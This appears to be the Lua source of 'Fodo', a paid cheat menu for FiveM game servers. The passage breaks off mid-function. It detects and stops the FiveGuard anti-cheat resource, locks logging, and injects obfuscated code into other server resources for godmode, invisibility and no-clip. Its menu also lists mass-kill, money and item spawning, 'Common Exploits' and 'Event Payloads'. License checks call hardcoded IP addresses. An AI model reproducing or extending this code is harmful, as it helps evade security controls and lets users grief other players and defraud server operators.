-- =========================================================
-- FODO client — Macho-bound auth ENFORCED (no manual typing)
-- Back-end: /FodoAuthMacho?macho=<MACHO>&version=<VER>
-- Requires you redeem in Discord with: /redeem key:XXXX macho:<MACHO_KEY>
-- =========================================================

-- Public gates you can use anywhere
-- FODO_AUTH_OK    = false     -- becomes true only on successful auth
-- FODO_AUTH_READY = false     -- becomes true once we have a final result (success or failure)
-- FODO_VIP        = false     -- set by server; shows whether this Macho has VIP
-- function FODO_IsAuthed() return FODO_AUTH_OK end
-- function FODO_HasVIP()   return FODO_VIP    end

-- ===== helpers =====
local function urlencode(str)
    if not str then return "" end
    str = str:gsub("\n", "\r\n")
    str = str:gsub("([^%w%-_%.%~])", function(c) return string.format("%%%02X", string.byte(c)) end)
    return str
end
local function is_likely_json(s)
    if type(s) ~= "string" then return false end
    local first = (s:match("^%s*(.)") or "")
    return first == "{" or first == "["
end
local function json_decode_safe(s)
    if not (json and json.decode) then return nil end
    local ok, t = pcall(json.decode, s)
    if ok and type(t) == "table" then return t end
    return nil
end
local function safe_web_request(url)
    if type(MachoWebRequest) ~= "function" then return nil end
    local ok, resp = pcall(MachoWebRequest, url)
    if not ok then return nil end
    return resp
end

-- ===== config =====
local VERSION = "3.1"
-- local HOSTS   = { "185.249.196.36:3000", "127.0.0.1:3000", "localhost:3000" }
local DEBUG   = (GetConvar and (GetConvar("fodo_debug","0") == "1")) or false

local function humanize(sec)
    sec = math.floor(tonumber(sec) or 0)
    local d = math.floor(sec/86400); sec = sec%86400
    local h = math.floor(sec/3600);  sec = sec%3600
    local m = math.floor(sec/60);    local s = sec%60
    local out={}
    if d>0 then out[#out+1]=d.."d" end
    if h>0 then out[#out+1]=h.."h" end
    if m>0 then out[#out+1]=m.."m" end
    if s>0 or #out==0 then out[#out+1]=s.."s" end
    return table.concat(out, " ")
end

-- Wait helper so you can block menu creation cleanly
local function FODO_WaitForAuth(timeout_ms)
    local t0 = GetGameTimer()
    while not FODO_AUTH_READY do
        if GetGameTimer() - t0 >= (timeout_ms or 8000) then break end
        Wait(0)
    end
    return FODO_AUTH_OK
end

-- ===== Auth thread (runs immediately on load) =====
-- CreateThread(function()
    -- Pull the MachoAuthenticationKey from your environment
--     local macho_key = ""
--     if type(MachoAuthenticationKey) == "function" then
--         local ok, val = pcall(MachoAuthenticationKey)
--         if ok and val then macho_key = tostring(val) end
--     end
--     if macho_key == "" then
--         print(("[FODO] v%s | Missing MachoAuthenticationKey on client."):format(VERSION))
--         FODO_AUTH_OK, FODO_AUTH_READY = false, true
--         return
--     end

--     local response, url_used
--     for _,host in ipairs(HOSTS) do
--         local url = string.format("http://%s/FodoAuthMacho?macho=%s&version=%s", host, urlencode(macho_key), urlencode(VERSION))
--         url_used = url
--         response = safe_web_request(url)
--         if response and response ~= "" then break end
--     end

--     if not response or response == "" then
--         print(("[FODO] v%s | Server unreachable."):format(VERSION))
--         if DEBUG then print("[FODO] last URL:", url_used or "n/a") end
--         FODO_AUTH_OK, FODO_AUTH_READY = false, true
--         return
--     end

--     local trimmed = (response:match("^%s*(.-)%s*$")) or response
--     if not is_likely_json(trimmed) then
--         print(("[FODO] v%s | Bad response."):format(VERSION))
--         if DEBUG then print("[FODO] RAW:", trimmed) end
--         FODO_AUTH_OK, FODO_AUTH_READY = false, true
--         return
--     end

--     local data = json_decode_safe(trimmed)
--     if not data then
--         print(("[FODO] v%s | Bad response."):format(VERSION))
--         if DEBUG then print("[FODO] RAW:", trimmed) end
--         FODO_AUTH_OK, FODO_AUTH_READY = false, true
--         return
--     end

--     if (data.auth == true or data.auth == "true") and data.expires_in_seconds then
--         -- success
--         FODO_AUTH_OK, FODO_AUTH_READY = true, true

--         -- VIP flag from server (non-breaking extra)
--         FODO_VIP = (data.vip == true)

--         -- keep online presence fresh (15s heartbeat)
--         CreateThread(function()
--             while FODO_AUTH_OK do
--                 Wait(15000)
--                 for _,h in ipairs(HOSTS) do
--                     local ping = string.format("http://%s/FodoPing?macho=%s", h, urlencode(macho_key))
--                     local _ = safe_web_request(ping)
--                     if _ then break end
--                 end
--             end
--         end)

--         local left = humanize(data.expires_in_seconds)
--         local plan = tostring(data.plan or "?")
--         local exp  = tostring(data.expires_at or "?")
--         local vip  = FODO_VIP and " • VIP" or ""
--         print(("[FODO] v%s | Plan: %s | Left: %s | Expiry: %s%s"):format(VERSION, plan, left, exp, vip))
--         return
--     end

--     -- Failed: show one-line, clean reason; DO NOT build menu later
--     local err = tostring(data.error or "unknown")
--     if err == "outdated" then
--         print(("[FODO] v%s | Outdated. Required: %s"):format(VERSION, tostring(data.required or "?")))
--     elseif err == "missing_macho" then
--         print(("[FODO] v%s | No Macho key provided."):format(VERSION))
--     elseif err == "not_bound_or_inactive" then
--         print(("[FODO] v%s | Not bound or no active license.\nRedeem in Discord: /redeem key:XXXX-XXXX-XXXX-XXXX macho:<YOUR-MACHO-KEY>"):format(VERSION))
--     elseif err == "expired" or err == "License key expired" then
--         print(("[FODO] v%s | License expired. Please renew."):format(VERSION))
--     else
--         print(("[FODO] v%s | Auth failed: %s"):format(VERSION, err))
--     end
--     FODO_AUTH_OK, FODO_AUTH_READY = false, true
-- end)

-- -- ===== ENFORCEMENT: block menu creation unless authed =====
-- -- Call this before building your UI or running any features.
-- local function FODO_RequireAuthOrNotify()
--     if FODO_AUTH_READY and FODO_AUTH_OK then return true end
--     if not FODO_AUTH_READY then FODO_WaitForAuth(8000) end
--     if FODO_AUTH_OK then return true end

--     -- One subtle, user-facing message (no spam):
--     if type(MachoMenuNotification) == "function" then
--         MachoMenuNotification("FODO.LUA", "RENEW LICENSE • Redeem in Discord with /redeem and your MACHO key.")
--     end
--     return false
-- end

-- -- =========================================================
-- -- >>> BUILD YOUR MENU ONLY AFTER AUTH SUCCEEDS <<<
-- -- =========================================================
-- if not FODO_RequireAuthOrNotify() then
--     -- Stop here. Do NOT create any windows/toggles/features.
--     return
-- end

-- If your file continues below with menu creation, it will only run when authed.
-- Example usage inside your UI builder:
--   if FODO_HasVIP() then
--       -- show VIP tab / features
--   end







-- Menu Builder
local MenuSize = vec2(750, 500)
local MenuStartCoords = vec2(500, 500)

local TabsBarWidth = 150
local SectionsPadding = 10
local MachoPanelGap = 15

local SectionChildWidth = MenuSize.x - TabsBarWidth
local SectionChildHeight = MenuSize.y - (2 * SectionsPadding)

local ColumnWidth = (SectionChildWidth - (SectionsPadding * 3)) / 2
local HalfHeight = (SectionChildHeight - (SectionsPadding * 3)) / 2

local MenuWindow = MachoMenuTabbedWindow("Fodo", MenuStartCoords.x, MenuStartCoords.y, MenuSize.x, MenuSize.y, TabsBarWidth)
MachoMenuSetKeybind(MenuWindow, 0x14)
MachoMenuSetAccent(MenuWindow, 52, 137, 235)

MachoMenuText(MenuWindow, "discord.gg/gamerware")

-- local function CreateRainbowInterface()
--     CreateThread(function()
--         local offset = 0.0
--         while true do
--             offset = offset + 0.065
--             local r = math.floor(127 + 127 * math.sin(offset))
--             local g = math.floor(127 + 127 * math.sin(offset + 2))
--             local b = math.floor(127 + 127 * math.sin(offset + 4))
--             MachoMenuSetAccent(MenuWindow, r, g, b)
--             Wait(25)
--         end
--     end)
-- end

-- CreateRainbowInterface()

local PlayerTab = MachoMenuAddTab(MenuWindow, "Self")
local ServerTab = MachoMenuAddTab(MenuWindow, "Server")
local TeleportTab = MachoMenuAddTab(MenuWindow, "Teleport")
local WeaponTab = MachoMenuAddTab(MenuWindow, "Weapon")
local VehicleTab = MachoMenuAddTab(MenuWindow, "Vehicle")
local EmoteTab = MachoMenuAddTab(MenuWindow, "Animations")
local EventTab = MachoMenuAddTab(MenuWindow, "Triggers")
local SettingTab = MachoMenuAddTab(MenuWindow, "Settings")
local VIPTab = MachoMenuAddTab(MenuWindow, "VIP")

-- Tab Content
local function PlayerTabContent(tab)
    local leftX = TabsBarWidth + SectionsPadding
    local topY = SectionsPadding + MachoPanelGap
    local midY = topY + HalfHeight + SectionsPadding
    local rightX = leftX + ColumnWidth + SectionsPadding

    local totalRightHeight = (HalfHeight * 2) + SectionsPadding

    local SectionOne = MachoMenuGroup(tab, "Self", leftX, topY, leftX + ColumnWidth, topY + totalRightHeight)

    local SectionTwo = MachoMenuGroup(tab, "Model Changer", rightX, topY, rightX + ColumnWidth, topY + HalfHeight)
    local SectionThree = MachoMenuGroup(tab, "Functions", rightX, midY, rightX + ColumnWidth, midY + HalfHeight)

    return SectionOne, SectionTwo, SectionThree
end

local function ServerTabContent(tab)
    local EachSectionWidth = (SectionChildWidth - (SectionsPadding * 3)) / 2
    local SectionOneStartX = TabsBarWidth + SectionsPadding
    local SectionOneEndX = SectionOneStartX + EachSectionWidth
    local SectionOne = MachoMenuGroup(tab, "Player", SectionOneStartX, SectionsPadding + MachoPanelGap, SectionOneEndX, SectionChildHeight)

    local SectionTwoStartX = SectionOneEndX + SectionsPadding
    local SectionTwoEndX = SectionTwoStartX + EachSectionWidth
    local SectionTwo = MachoMenuGroup(tab, "Everyone", SectionTwoStartX, SectionsPadding + MachoPanelGap, SectionTwoEndX, SectionChildHeight)

    return SectionOne, SectionTwo
end

local function TeleportTabContent(tab)
    local EachSectionWidth = (SectionChildWidth - (SectionsPadding * 3)) / 2
    local SectionOneStartX = TabsBarWidth + SectionsPadding
    local SectionOneEndX = SectionOneStartX + EachSectionWidth
    local SectionOne = MachoMenuGroup(tab, "Teleport", SectionOneStartX, SectionsPadding + MachoPanelGap, SectionOneEndX, SectionChildHeight)

    local SectionTwoStartX = SectionOneEndX + SectionsPadding
    local SectionTwoEndX = SectionTwoStartX + EachSectionWidth
    local SectionTwo = MachoMenuGroup(tab, "Other", SectionTwoStartX, SectionsPadding + MachoPanelGap, SectionTwoEndX, SectionChildHeight)

    return SectionOne, SectionTwo
end

local function WeaponTabContent(tab)
    local leftX = TabsBarWidth + SectionsPadding
    local topY = SectionsPadding + MachoPanelGap
    local midY = topY + HalfHeight + SectionsPadding

    local SectionOne = MachoMenuGroup(tab, "Mods", leftX, topY, leftX + ColumnWidth, topY + HalfHeight)
    local SectionTwo = MachoMenuGroup(tab, "Spawner", leftX, midY, leftX + ColumnWidth, midY + HalfHeight)

    local rightX = leftX + ColumnWidth + SectionsPadding
    local SectionThree = MachoMenuGroup(tab, "Other", rightX, SectionsPadding + MachoPanelGap, rightX + ColumnWidth, SectionChildHeight)

    return SectionOne, SectionTwo, SectionThree
end

local function VehicleTabContent(tab)
    local leftX = TabsBarWidth + SectionsPadding
    local topY = SectionsPadding + MachoPanelGap
    local midY = topY + HalfHeight + SectionsPadding

    local SectionOne = MachoMenuGroup(tab, "Mods", leftX, topY, leftX + ColumnWidth, topY + HalfHeight)
    local SectionTwo = MachoMenuGroup(tab, "Plate & Spawning", leftX, midY, leftX + ColumnWidth, midY + HalfHeight)

    local rightX = leftX + ColumnWidth + SectionsPadding
    local SectionThree = MachoMenuGroup(tab, "Other", rightX, SectionsPadding + MachoPanelGap, rightX + ColumnWidth, SectionChildHeight)

    return SectionOne, SectionTwo, SectionThree
end

local function EmoteTabContent(tab)
    local EachSectionWidth = (SectionChildWidth - (SectionsPadding * 3)) / 2
    local SectionOneStartX = TabsBarWidth + SectionsPadding
    local SectionOneEndX = SectionOneStartX + EachSectionWidth
    local SectionOne = MachoMenuGroup(tab, "Animations", SectionOneStartX, SectionsPadding + MachoPanelGap, SectionOneEndX, SectionChildHeight)

    local SectionTwoStartX = SectionOneEndX + SectionsPadding
    local SectionTwoEndX = SectionTwoStartX + EachSectionWidth
    local SectionTwo = MachoMenuGroup(tab, "Force Emotes", SectionTwoStartX, SectionsPadding + MachoPanelGap, SectionTwoEndX, SectionChildHeight)

    return SectionOne, SectionTwo
end

local function EventTabContent(tab)
    local leftX = TabsBarWidth + SectionsPadding
    local topY = SectionsPadding + MachoPanelGap
    local midY = topY + HalfHeight + SectionsPadding

    local SectionOne = MachoMenuGroup(tab, "Item Spawner", leftX, topY, leftX + ColumnWidth, topY + HalfHeight)
    local SectionTwo = MachoMenuGroup(tab, "Money Spawner", leftX, midY, leftX + ColumnWidth, midY + HalfHeight)

    local rightX = leftX + ColumnWidth + SectionsPadding
    local SectionThree = MachoMenuGroup(tab, "Common Exploits", rightX, topY, rightX + ColumnWidth, topY + HalfHeight)
    local SectionFour = MachoMenuGroup(tab, "Event Payloads", rightX, midY, rightX + ColumnWidth, midY + HalfHeight)

    return SectionOne, SectionTwo, SectionThree, SectionFour
end

local function VIPTabContent(tab)
    local leftX = TabsBarWidth + SectionsPadding
    local topY = SectionsPadding + MachoPanelGap
    local midY = topY + HalfHeight + SectionsPadding

    local SectionOne = MachoMenuGroup(tab, "Item Spawner", leftX, topY, leftX + ColumnWidth, topY + HalfHeight)
    local SectionTwo = MachoMenuGroup(tab, "Common Exploits", leftX, midY, leftX + ColumnWidth, midY + HalfHeight)

    local rightX = leftX + ColumnWidth + SectionsPadding
    local SectionThree = MachoMenuGroup(tab, "Common Exploits V2", rightX, SectionsPadding + MachoPanelGap, rightX + ColumnWidth, SectionChildHeight)

    return SectionOne, SectionTwo, SectionThree
end

local function SettingTabContent(tab)
    local leftX = TabsBarWidth + SectionsPadding
    local topY = SectionsPadding + MachoPanelGap
    local midY = topY + HalfHeight + SectionsPadding

    local SectionOne = MachoMenuGroup(tab, "Unload", leftX, topY, leftX + ColumnWidth, topY + HalfHeight)
    local SectionTwo = MachoMenuGroup(tab, "Menu Design", leftX, midY, leftX + ColumnWidth, midY + HalfHeight)

    local rightX = leftX + ColumnWidth + SectionsPadding
    local SectionThree = MachoMenuGroup(tab, "Server Settings", rightX, SectionsPadding + MachoPanelGap, rightX + ColumnWidth, SectionChildHeight)

    return SectionOne, SectionTwo, SectionThree
end

-- Tab Sections
local PlayerTabSections = { PlayerTabContent(PlayerTab) }
local ServerTabSections = { ServerTabContent(ServerTab) }
local TeleportTabSections = { TeleportTabContent(TeleportTab) }
local WeaponTabSections = { WeaponTabContent(WeaponTab) }
local VehicleTabSections = { VehicleTabContent(VehicleTab) }
local EmoteTabSections = { EmoteTabContent(EmoteTab) }
local EventTabSections = { EventTabContent(EventTab) }
local VIPTabSections = { VIPTabContent(VIPTab) }
local SettingTabSections = { SettingTabContent(SettingTab) }

-- Functions
local function CheckResource(resource)
    return GetResourceState(resource) == "started"
end

-- Key Validation
local PrivateAuthkey = MachoAuthenticationKey()

local function HasValidKey()
    local PrivateURL = "http://185.244.106.161/Private_keys.txt?auth=OWFkNDczNWJmNWMwNDUyNGEwNGQ3ODgzZGMzNmRjYTc"
    local PrivateContent = MachoWebRequest(PrivateURL)

    if not PrivateContent or PrivateContent == "" then
        return false
    end

    for line in string.gmatch(PrivateContent, "[^\r\n]+") do
        if line == PrivateAuthkey then
            return true
        end
    end

    return false
end

local function HasValidStaffKey()
    local StaffURL = "http://185.244.106.161/Staff_keys.txt?auth=OWFkNDczNWJmNWMwNDUyNGEwNGQ3ODgzZGMzNmRjYTc"
    local StaffContent = MachoWebRequest(StaffURL)

    if not StaffContent or StaffContent == "" then
        return false
    end

    for line in string.gmatch(StaffContent, "[^\r\n]+") do
        if line == PrivateAuthkey then
            return true
        end
    end

    return false
end


local function LoadBypasses()
    Wait(1500)

    MachoMenuNotification("[NOTIFICATION] Fodo Menu", "Loading Bypasses.")

    local function DetectFiveGuard()
        local function ResourceFileExists(resourceName, fileName)
            local file = LoadResourceFile(resourceName, fileName)
            return file ~= nil
        end

        local fiveGuardFile = "ai_module_fg-obfuscated.lua"
        local numResources = GetNumResources()

        for i = 0, numResources - 1 do
            local resourceName = GetResourceByFindIndex(i)
            if ResourceFileExists(resourceName, fiveGuardFile) then
                return true, resourceName
            end
        end

        return false, nil
    end

    Wait(100)

    local found, resourceName = DetectFiveGuard()
    if found and resourceName then
        MachoResourceStop(resourceName)
    end

    Wait(100)

    MachoMenuNotification("[NOTIFICATION] Fodo Menu", "Finalizing.")

    Wait(500)

    MachoMenuNotification("[NOTIFICATION] Fodo Menu", "Finished Enjoy.")
end

LoadBypasses()

local targetResource
if GetResourceState("qbx_core") == "started" then
    targetResource = "qbx_core"
elseif GetResourceState("es_extended") == "started" then
    targetResource = "es_extended"
elseif GetResourceState("qb-core") == "started" then
    targetResource = "qb-core"
else
    targetResource = "any"
end

MachoLockLogger()

-- Locals
MachoInjectResource((CheckResource("core") and "core") or (CheckResource("es_extended") and "es_extended") or (CheckResource("qb-core") and "qb-core") or (CheckResource("monitor") and "monitor") or "any", [[
    local xJdRtVpNzQmKyLf = false -- Free Camera
]])

MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
    Unloaded = false
    local aXfPlMnQwErTyUi = false -- Godmode
    local sRtYuIoPaSdFgHj = false -- Invisibility
    local mKjHgFdSaPlMnBv = false -- No Ragdoll
    local uYtReWqAzXcVbNm = false -- Infinite Stamina
    local peqCrVzHDwfkraYZ = false -- Shrink Ped
    local NpYgTbUcXsRoVm = false -- No Clip
    local xCvBnMqWeRtYuIo = false -- Super Jump
    local nxtBFlQWMMeRLs = false -- Levitation
    local fgawjFmaDjdALaO = false -- Super Strength
    local qWeRtYuIoPlMnBv = false -- Super Punch
    local zXpQwErTyUiPlMn = false -- Throw From Vehicle
    local kJfGhTrEeWqAsDz = false -- Force Third Person
    local zXcVbNmQwErTyUi = false -- Force Driveby
    local yHnvrVNkoOvGMWiS = false -- Anti-Headshot
    local nHgFdSaZxCvBnMq = false -- Anti-Freeze
    local fAwjeldmwjrWkSf = false -- Anti-TP
    local aDjsfmansdjwAEl = false -- Anti-Blackscreen
    local qWpEzXvBtNyLmKj = false -- Crosshair

    local egfjWADmvsjAWf = false -- Spoofed Weapon Spawning
    local LkJgFdSaQwErTy = false -- Infinite Ammo
    local QzWxEdCvTrBnYu = false -- Explosive Ammo
    local RfGtHyUjMiKoLp = false -- One Shot Kill 

    local zXcVbNmQwErTyUi = false -- Vehicle Godmode
    local RNgZCddPoxwFhmBX = false -- Force Vehicle Engine
    local PlAsQwErTyUiOp = false -- Vehicle Auto Repair
    local LzKxWcVbNmQwErTy = false -- Freeze Vehicle
    local NuRqVxEyKiOlZm = false -- Vehicle Hop
    local GxRpVuNzYiTq = false -- Rainbow Vehicle
    local MqTwErYuIoLp = false -- Drift Mode
    local NvGhJkLpOiUy = false -- Easy Handling
    local VkLpOiUyTrEq = false -- Instant Breaks
    local BlNkJmLzXcVb = false -- Unlimited Fuel

    local AsDfGhJkLpZx = false -- Spectate Player
    local aSwDeFgHiJkLoPx = false -- Normal Kill Everyone
    local qWeRtYuIoPlMnAb = false -- Permanent Kill Everyone
    local tUOgshhvIaku = false -- RPG Kill Everyone
    local zXcVbNmQwErTyUi = false -- 
]])

-- Features
MachoMenuCheckbox(PlayerTabSections[1], "Godmode", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        if aXfPlMnQwErTyUi == nil then aXfPlMnQwErTyUi = false end
        aXfPlMnQwErTyUi = true

        local function OxWJ1rY9vB()
            local fLdRtYpLoWqEzXv = CreateThread
            fLdRtYpLoWqEzXv(function()
                while aXfPlMnQwErTyUi and not Unloaded do
                    local dOlNxGzPbTcQ = PlayerPedId()
                    local rKsEyHqBmUiW = PlayerId()

                    if GetResourceState("ReaperV4") == "started" then
                        local kcWsWhJpCwLI = SetPlayerInvincible
                        local ByTqMvSnAzXd = SetEntityInvincible
                        kcWsWhJpCwLI(rKsEyHqBmUiW, true)
                        ByTqMvSnAzXd(dOlNxGzPbTcQ, true)

                    elseif GetResourceState("WaveShield") == "started" then
                        local cvYkmZYIjvQQ = SetEntityCanBeDamaged
                        cvYkmZYIjvQQ(dOlNxGzPbTcQ, false)

                    else
                        local BiIqUJHexRrR = SetEntityCanBeDamaged
                        local UtgGRNyiPhOs = SetEntityProofs
                        local rVuKoDwLsXpC = SetEntityInvincible

                        BiIqUJHexRrR(dOlNxGzPbTcQ, false)
                        UtgGRNyiPhOs(dOlNxGzPbTcQ, true, true, true, false, true, false, false, false)
                        rVuKoDwLsXpC(dOlNxGzPbTcQ, true)
                    end

                    Wait(0)
                end
            end)
        end

        OxWJ1rY9vB()
    ]])
end, function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        aXfPlMnQwErTyUi = false

        local dOlNxGzPbTcQ = PlayerPedId()
        local rKsEyHqBmUiW = PlayerId()

        if GetResourceState("ReaperV4") == "started" then
            local kcWsWhJpCwLI = SetPlayerInvincible
            local ByTqMvSnAzXd = SetEntityInvincible

            kcWsWhJpCwLI(rKsEyHqBmUiW, false)
            ByTqMvSnAzXd(dOlNxGzPbTcQ, false)

        elseif GetResourceState("WaveShield") == "started" then
            local AilJsyZTXnNc = SetEntityCanBeDamaged
            AilJsyZTXnNc(dOlNxGzPbTcQ, true)

        else
            local tBVAZMubUXmO = SetEntityCanBeDamaged
            local yuTiZtxOXVnE = SetEntityProofs
            local rVuKoDwLsXpC = SetEntityInvincible

            tBVAZMubUXmO(dOlNxGzPbTcQ, true)
            yuTiZtxOXVnE(dOlNxGzPbTcQ, false, false, false, false, false, false, false, false)
            rVuKoDwLsXpC(dOlNxGzPbTcQ, false)
        end
    ]])
end)

-- MachoMenuCheckbox(PlayerTabSections[1], "Godmode", function()
--     MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
--         if aXfPlMnQwErTyUi == nil then aXfPlMnQwErTyUi = false end
--         aXfPlMnQwErTyUi = true

--         local function OxWJ1rY9vB()
--             local fLdRtYpLoWqEzXv = CreateThread
--             fLdRtYpLoWqEzXv(function()
--                 while aXfPlMnQwErTyUi and not Unloaded do
--                     if GetResourceState("ReaperV4") == "started" then
--                         local kcWsWhJpCwLI = SetPlayerInvincible
--                         kcWsWhJpCwLI(PlayerPedId(), true)

--                     elseif GetResourceState("WaveShield") == "started" then
--                         local cvYkmZYIjvQQ = SetEntityCanBeDamaged
--                         cvYkmZYIjvQQ(PlayerPedId(), false)

--                     else
--                         local BiIqUJHexRrR = SetEntityCanBeDamaged
--                         local UtgGRNyiPhOs = SetEntityProofs
                                                
--                         BiIqUJHexRrR(PlayerPedId(), false)
--                         UtgGRNyiPhOs(PlayerPedId(), true, true, true, false, true, false, false, false)
--                     end

--                     Wait(0)
--                 end
--             end)
--         end

--         OxWJ1rY9vB()
--     ]])
-- end, function()
--     MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
--         aXfPlMnQwErTyUi = false
--         if GetResourceState("ReaperV4") == "started" then
--             local kcWsWhJpCwLI = SetPlayerInvincible

--             kcWsWhJpCwLI(PlayerPedId(), false)

--         elseif GetResourceState("WaveShield") == "started" then
--             local AilJsyZTXnNc = SetEntityCanBeDamaged

--             AilJsyZTXnNc(PlayerPedId(), true)

--         else
--             local tBVAZMubUXmO = SetEntityCanBeDamaged
--             local yuTiZtxOXVnE = SetEntityProofs

--             tBVAZMubUXmO(PlayerPedId(), true)
--             yuTiZtxOXVnE(PlayerPedId(), false, false, false, false, false, false, false, false)
--         end
--     ]])
-- end)

MachoMenuCheckbox(PlayerTabSections[1], "Invisibility", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        if sRtYuIoPaSdFgHj == nil then sRtYuIoPaSdFgHj = false end
        sRtYuIoPaSdFgHj = true

        local function d2NcWoyTfb()
            if sRtYuIoPaSdFgHj == nil then sRtYuIoPaSdFgHj = false end
            sRtYuIoPaSdFgHj = true

            local zXwCeVrBtNuMyLk = CreateThread
            zXwCeVrBtNuMyLk(function()
                while sRtYuIoPaSdFgHj and not Unloaded do
                    local uYiTpLaNmZxCwEq = SetEntityVisible
                    local hGfDrEsWxQaZcVb = PlayerPedId()
                    uYiTpLaNmZxCwEq(hGfDrEsWxQaZcVb, false, false)
                    Wait(0)
                end

                local uYiTpLaNmZxCwEq = SetEntityVisible
                local hGfDrEsWxQaZcVb = PlayerPedId()
                uYiTpLaNmZxCwEq(hGfDrEsWxQaZcVb, true, false)
            end)
        end

        d2NcWoyTfb()
    ]])
end, function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        sRtYuIoPaSdFgHj = false

        local function tBKM4syGJL()
            local uYiTpLaNmZxCwEq = SetEntityVisible
            local hGfDrEsWxQaZcVb = PlayerPedId()
            uYiTpLaNmZxCwEq(hGfDrEsWxQaZcVb, true, false)
        end

        tBKM4syGJL()
    ]])
end)

MachoMenuCheckbox(PlayerTabSections[1], "No Ragdoll", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        if mKjHgFdSaPlMnBv == nil then mKjHgFdSaPlMnBv = false end
        mKjHgFdSaPlMnBv = true

        local function jP7xUrK9Ao()
            local zVpLyNrTmQxWsEd = CreateThread
            zVpLyNrTmQxWsEd(function()
                while mKjHgFdSaPlMnBv and not Unloaded do
                    local oPaSdFgHiJkLzXc = SetPedCanRagdoll
                    oPaSdFgHiJkLzXc(PlayerPedId(), false)
                    Wait(0)
                end
            end)
        end

        jP7xUrK9Ao()
    ]])
end, function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        mKjHgFdSaPlMnBv = false
    ]])
end)

MachoMenuCheckbox(PlayerTabSections[1], "Infinite Stamina", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        if uYtReWqAzXcVbNm == nil then uYtReWqAzXcVbNm = false end
        uYtReWqAzXcVbNm = true

        local function YLvd3pM0tB()
            local tJrGyHnMuQwSaZx = CreateThread
            tJrGyHnMuQwSaZx(function()
                while uYtReWqAzXcVbNm and not Unloaded do
                    local aSdFgHjKlQwErTy = RestorePlayerStamina
                    local rTyUiEaOpAsDfGhJk = PlayerId()
                    aSdFgHjKlQwErTy(rTyUiEaOpAsDfGhJk, 1.0)
                    Wait(0)
                end
            end)
        end

        YLvd3pM0tB()
    ]])
end, function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        uYtReWqAzXcVbNm = false
    ]])
end)

MachoMenuCheckbox(PlayerTabSections[1], "Tiny Ped", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        if peqCrVzHDwfkraYZ == nil then peqCrVzHDwfkraYZ = false end
        peqCrVzHDwfkraYZ = true

        local function YfeemkaufrQjXTFY()
            local OLZACovzmAvgWPmC = CreateThread
            OLZACovzmAvgWPmC(function()
                while peqCrVzHDwfkraYZ and not Unloaded do
                    local aukLdkvEinBsMWuA = SetPedConfigFlag
                    aukLdkvEinBsMWuA(PlayerPedId(), 223, true)
                    Wait(0)
                end
            end)
        end

        YfeemkaufrQjXTFY()
    ]])
end, function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        peqCrVzHDwfkraYZ = false
        local aukLdkvEinBsMWuA = SetPedConfigFlag
        aukLdkvEinBsMWuA(PlayerPedId(), 223, false)
    ]])
end)

MachoMenuCheckbox(PlayerTabSections[1], "No Clip", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        if NpYgTbUcXsRoVm == nil then NpYgTbUcXsRoVm = false end
        NpYgTbUcXsRoVm = true

        local function KUQpH7owdz()
            local RvBcNxMzKgUiLo = PlayerPedId
            local EkLpOiUhYtGrFe = GetVehiclePedIsIn
            local CtVbXnMzQaWsEd = GetEntityCoords
            local DrTgYhUjIkOlPm = GetEntityHeading
            local QiWzExRdCtVbNm = GetGameplayCamRelativeHeading
            local AoSdFgHjKlZxCv = GetGameplayCamRelativePitch
            local JkLzXcVbNmAsDf = IsDisabledControlJustPressed
            local TyUiOpAsDfGhJk = IsDisabledControlPressed
            local WqErTyUiOpAsDf = SetEntityCoordsNoOffset
            local PlMnBvCxZaSdFg = SetEntityHeading
            local HnJmKlPoIuYtRe = CreateThread

            local YtReWqAzXsEdCv = false

            HnJmKlPoIuYtRe(function()
                while NpYgTbUcXsRoVm and not Unloaded do
                    Wait(0)

                    if JkLzXcVbNmAsDf(0, 303) then
                        YtReWqAzXsEdCv = not YtReWqAzXsEdCv
                    end

                    if YtReWqAzXsEdCv then
                        local speed = 2.0

                        local p = RvBcNxMzKgUiLo()
                        local v = EkLpOiUhYtGrFe(p, false)
                        local inVeh = v ~= 0 and v ~= nil
                        local ent = inVeh and v or p

                        local pos = CtVbXnMzQaWsEd(ent, true)
                        local head = QiWzExRdCtVbNm() + DrTgYhUjIkOlPm(ent)
                        local pitch = AoSdFgHjKlZxCv()

                        local dx = -math.sin(math.rad(head))
                        local dy = math.cos(math.rad(head))
                        local dz = math.sin(math.rad(pitch))
                        local len = math.sqrt(dx * dx + dy * dy + dz * dz)

                        if len ~= 0 then
                            dx, dy, dz = dx / len, dy / len, dz / len
                        end

                        if TyUiOpAsDfGhJk(0, 21) then speed = speed + 2.5 end
                        if TyUiOpAsDfGhJk(0, 19) then speed = 0.25 end

                        if TyUiOpAsDfGhJk(0, 32) then
                            pos = pos + vector3(dx, dy, dz) * speed
                        end
                        if TyUiOpAsDfGhJk(0, 34) then
                            pos = pos + vector3(-dy, dx, 0.0) * speed
                        end
                        if TyUiOpAsDfGhJk(0, 269) then
                            pos = pos - vector3(dx, dy, dz) * speed
                        end
                        if TyUiOpAsDfGhJk(0, 9) then
                            pos = pos + vector3(dy, -dx, 0.0) * speed
                        end
                        if TyUiOpAsDfGhJk(0, 22) then
